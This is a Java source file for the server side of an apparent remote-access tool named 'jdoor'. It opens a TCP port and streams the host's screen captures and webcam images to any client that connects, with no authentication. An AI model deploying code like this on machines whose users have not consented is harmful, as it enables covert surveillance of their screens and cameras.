package com.jdoor.server;

import com.jdoor.server.screen.ScreenCaptureThread;
import com.jdoor.server.webcam.WebcamCaptureThread;

import java.awt.*;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import static com.jdoor.Constants.TCP_PORT;

public class Server {
    private static boolean running = true;
    public static void main(String[] args) throws IOException {
        ServerSocket ss = new ServerSocket(TCP_PORT);
        ScreenCaptureThread screenCaptureThread = null;
        WebcamCaptureThread webcamCaptureThread = null;
        // Ottenere thread che manda le schermate.
        try {
            screenCaptureThread = ScreenCaptureThread.getScreenCaptureThread();
            screenCaptureThread.start();

            webcamCaptureThread = WebcamCaptureThread.getWebcamCaptureThread();
            webcamCaptureThread.start();
        } catch (AWTException awte) {
            awte.printStackTrace();
            return;
        }

        while (running) {
            Socket client = ss.accept();
            System.out.println("Connection from " + client);

            ServerThread st = new ServerThread(client);
            st.start();
            // Aggiungere classe.
            screenCaptureThread.addClient(st);
            webcamCaptureThread.addClient(st);
        }
        screenCaptureThread.stopRunning();
        webcamCaptureThread.stopRunning();

        ss.close();
    }
}
